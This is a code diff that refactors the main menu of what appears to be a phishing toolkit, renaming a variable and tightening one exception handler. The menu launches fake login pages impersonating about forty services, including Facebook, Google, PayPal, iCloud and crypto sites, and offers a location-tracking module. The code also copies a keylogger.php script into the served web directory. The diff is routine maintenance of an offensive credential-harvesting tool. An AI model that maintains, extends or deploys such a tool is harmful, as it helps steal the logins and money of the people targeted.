@@ -45,176 +45,176 @@ def start_main_menu():
         print(localization.lang_start_main_menu["operation_mode"])
         print_sorted_as_menu(
             localization.lang_start_main_menu["facebook_operation_modes"])
-        customOption = input(global_localization.input_line)
-        start_phishing_page("Facebook", customOption)
+        custom_option = input(global_localization.input_line)
+        start_phishing_page("Facebook", custom_option)
     elif option == "02":
         module_loading_message("Google")
         print(localization.lang_start_main_menu["operation_mode"])
         print_sorted_as_menu(
             localization.lang_start_main_menu["google_operation_modes"])
-        customOption = input(global_localization.input_line)
-        start_phishing_page("Google", customOption)
+        custom_option = input(global_localization.input_line)
+        start_phishing_page("Google", custom_option)
     elif option == "03":
         module_loading_message("LinkedIn")
-        customOption = ""
-        start_phishing_page("LinkedIn", customOption)
+        custom_option = ""
+        start_phishing_page("LinkedIn", custom_option)
     elif option == "04":
         module_loading_message("GitHub")
-        customOption = ""
-        start_phishing_page("GitHub", customOption)
+        custom_option = ""
+        start_phishing_page("GitHub", custom_option)
     elif option == "05":
         module_loading_message("StackOverflow")
-        customOption = ""
-        start_phishing_page("StackOverflow", customOption)
+        custom_option = ""
+        start_phishing_page("StackOverflow", custom_option)
     elif option == "06":
         module_loading_message("WordPress")
-        customOption = ""
-        start_phishing_page("WordPress", customOption)
+        custom_option = ""
+        start_phishing_page("WordPress", custom_option)
     elif option == "07":
         module_loading_message("Twitter")
-        customOption = ""
-        start_phishing_page("Twitter", customOption)
+        custom_option = ""
+        start_phishing_page("Twitter", custom_option)
     elif option == "08":
         module_loading_message("Instagram")
         print(localization.lang_start_main_menu["operation_mode"])
         print_sorted_as_menu(
             localization.lang_start_main_menu["instagram_operation_modes"])
-        customOption = input(global_localization.input_line)
-        start_phishing_page("Instagram", customOption)
+        custom_option = input(global_localization.input_line)
+        start_phishing_page("Instagram", custom_option)
     elif option == "09":
         module_loading_message("Snapchat")
-        customOption = ""
-        start_phishing_page("Snapchat", customOption)
+        custom_option = ""
+        start_phishing_page("Snapchat", custom_option)
     elif option == "10":
         module_loading_message("Yahoo")
-        customOption = ""
-        start_phishing_page("Yahoo", customOption)
+        custom_option = ""
+        start_phishing_page("Yahoo", custom_option)
     elif option == "11":
         module_loading_message("Twitch")
-        customOption = ""
-        start_phishing_page("Twitch", customOption)
+        custom_option = ""
+        start_phishing_page("Twitch", custom_option)
     elif option == "12":
         module_loading_message("Microsoft")
-        customOption = ""
-        start_phishing_page("Microsoft", customOption)
+        custom_option = ""
+        start_phishing_page("Microsoft", custom_option)
     elif option == "13":
         module_loading_message("Steam")
-        customOption = ""
-        start_phishing_page("Steam", customOption)
+        custom_option = ""
+        start_phishing_page("Steam", custom_option)
     elif option == "14":
         module_loading_message("VK")
         print(localization.lang_start_main_menu["operation_mode"])
         print_sorted_as_menu(
             localization.lang_start_main_menu["VK_operation_modes"])
-        customOption = input(global_localization.input_line)
-        start_phishing_page("VK", customOption)
+        custom_option = input(global_localization.input_line)
+        start_phishing_page("VK", custom_option)
     elif option == "15":
         module_loading_message("iCloud")
-        customOption = ""
-        start_phishing_page("iCloud", customOption)
+        custom_option = ""
+        start_phishing_page("iCloud", custom_option)
     elif option == "16":
         module_loading_message("GitLab")
-        customOption = ""
-        start_phishing_page("GitLab", customOption)
+        custom_option = ""
+        start_phishing_page("GitLab", custom_option)
     elif option == "17":
         module_loading_message("NetFlix")
-        customOption = ""
-        start_phishing_page("NetFlix", customOption)
+        custom_option = ""
+        start_phishing_page("NetFlix", custom_option)
     elif option == "18":
         module_loading_message("Origin")
-        customOption = ""
-        start_phishing_page("Origin", customOption)
+        custom_option = ""
+        start_phishing_page("Origin", custom_option)
     elif option == "19":
         module_loading_message("Pinterest")
-        customOption = ""
-        start_phishing_page("Pinterest", customOption)
+        custom_option = ""
+        start_phishing_page("Pinterest", custom_option)
     elif option == "20":
         module_loading_message("ProtonMail")
-        customOption = ""
-        start_phishing_page("ProtonMail", customOption)
+        custom_option = ""
+        start_phishing_page("ProtonMail", custom_option)
     elif option == "21":
         module_loading_message("Spotify")
-        customOption = ""
-        start_phishing_page("Spotify", customOption)
+        custom_option = ""
+        start_phishing_page("Spotify", custom_option)
     elif option == "22":
         module_loading_message("Quora")
-        customOption = ""
-        start_phishing_page("Quora", customOption)
+        custom_option = ""
+        start_phishing_page("Quora", custom_option)
     elif option == "23":
         module_loading_message("PornHub")
-        customOption = ""
-        start_phishing_page("PornHub", customOption)
+        custom_option = ""
+        start_phishing_page("PornHub", custom_option)
     elif option == "24":
         module_loading_message("Adobe")
-        customOption = ""
-        start_phishing_page("Adobe", customOption)
+        custom_option = ""
+        start_phishing_page("Adobe", custom_option)
     elif option == "25":
         module_loading_message("Badoo")
-        customOption = ""
-        start_phishing_page("Badoo", customOption)
+        custom_option = ""
+        start_phishing_page("Badoo", custom_option)
     elif option == "26":
         module_loading_message("CryptoCurrency")
-        customOption = ""
-        start_phishing_page("CryptoCurrency", customOption)
+        custom_option = ""
+        start_phishing_page("CryptoCurrency", custom_option)
     elif option == "27":
         module_loading_message("DevianArt")
-        customOption = ""
-        start_phishing_page("DevianArt", customOption)
+        custom_option = ""
+        start_phishing_page("DevianArt", custom_option)
     elif option == "28":
         module_loading_message("DropBox")
-        customOption = ""
-        start_phishing_page("DropBox", customOption)
+        custom_option = ""
+        start_phishing_page("DropBox", custom_option)
     elif option == "29":
         module_loading_message("eBay")
-        customOption = ""
-        start_phishing_page("eBay", customOption)
+        custom_option = ""
+        start_phishing_page("eBay", custom_option)
     elif option == "30":
         module_loading_message("MySpace")
-        customOption = ""
-        start_phishing_page("Myspace", customOption)
+        custom_option = ""
+        start_phishing_page("Myspace", custom_option)
     elif option == "31":
         module_loading_message("PayPal")
-        customOption = ""
-        start_phishing_page("PayPal", customOption)
+        custom_option = ""
+        start_phishing_page("PayPal", custom_option)
     elif option == "32":
         module_loading_message("Shopify")
-        customOption = ""
-        start_phishing_page("Shopify", customOption)
+        custom_option = ""
+        start_phishing_page("Shopify", custom_option)
     elif option == "33":
         module_loading_message("Verizon")
-        customOption = ""
-        start_phishing_page("Verizon", customOption)
+        custom_option = ""
+        start_phishing_page("Verizon", custom_option)
     elif option == "34":
         module_loading_message("Yandex")
-        customOption = ""
-        start_phishing_page("Yandex", customOption)
+        custom_option = ""
+        start_phishing_page("Yandex", custom_option)
     elif option == "35":
         module_loading_message("Reddit")
         print(localization.lang_start_main_menu["operation_mode"])
         print_sorted_as_menu(
             localization.lang_start_main_menu["reddit_operation_modes"])
-        customOption = input(global_localization.input_line)
-        start_phishing_page("Reddit", customOption)
+        custom_option = input(global_localization.input_line)
+        start_phishing_page("Reddit", custom_option)
     elif option == "36":
         module_loading_message("Subitoit")
-        customOption = ""
-        start_phishing_page("Subitoit", customOption)
+        custom_option = ""
+        start_phishing_page("Subitoit", custom_option)
     elif option == "37":
         module_loading_message("PlayStation")
-        customOption = ""
-        start_phishing_page("PlayStation", customOption)
+        custom_option = ""
+        start_phishing_page("PlayStation", custom_option)
     elif option == "38":
         module_loading_message("Xbox")
-        customOption = ""
-        start_phishing_page("Xbox", customOption)
+        custom_option = ""
+        start_phishing_page("Xbox", custom_option)
     elif option == "39":
         module_loading_message("CUSTOM(1)")
-        customOption = ""
-        start_phishing_page("CUSTOM(1)", customOption)
+        custom_option = ""
+        start_phishing_page("CUSTOM(1)", custom_option)
     elif option == "40":
         module_loading_message("CUSTOM(2)")
-        customOption = ""
-        start_phishing_page("CUSTOM(2)", customOption)
+        custom_option = ""
+        start_phishing_page("CUSTOM(2)", custom_option)
         """PHISHING MODULES BELOW"""
 
     elif option == "0A":
@@ -223,8 +223,8 @@ def start_main_menu():
         print_sorted_as_menu(
             localization.
             lang_start_main_menu["additional_module_location_operation_modes"])
-        customOption = input(global_localization.input_line)
-        start_phishing_page("LOCATION", customOption)
+        custom_option = input(global_localization.input_line)
+        start_phishing_page("LOCATION", custom_option)
     else:
         start_main_menu()
 
@@ -241,7 +241,7 @@ def start_phishing_page(page, custom_option):  # Phishing pages selection menu
     copyfile("WebPages/keylogger.php", "Server/www/keylogger.php")
     try:
         remove("link.url")
-    except:
+    except FileNotFoundError:
         pass
 
     if custom_option == "1" and page == "Facebook":
